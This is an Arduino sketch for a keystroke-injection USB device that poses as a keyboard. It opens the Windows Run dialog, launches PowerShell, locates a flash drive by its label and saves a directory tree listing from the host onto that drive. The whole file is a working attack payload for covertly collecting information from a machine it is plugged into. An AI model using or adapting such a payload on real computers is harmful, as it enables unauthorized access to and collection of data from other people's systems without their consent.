/*
 * this code saves the tree output of drive C: to 
 * the specified removable storage as tree.txt
*/

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  payload();

}

void loop() {
  // nothing here
}

void payload(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  pressEnter();
  delay(1500);    // wait for powershell to launch. If it doesn't launch in time, the next keystrokes will be useless
  Keyboard.print("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'NAME' } | select name"); // change NAME to your flash name
  pressEnter();
  delay(100);
  Keyboard.print("$path = $usbPath.name+\"tree.txt\"");
  pressEnter();
  Keyboard.print("tree > $path");
  pressEnter();
  delay(1000);
  Keyboard.print("exit");
  pressEnter();
  
}

void pressEnter(){
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  
}
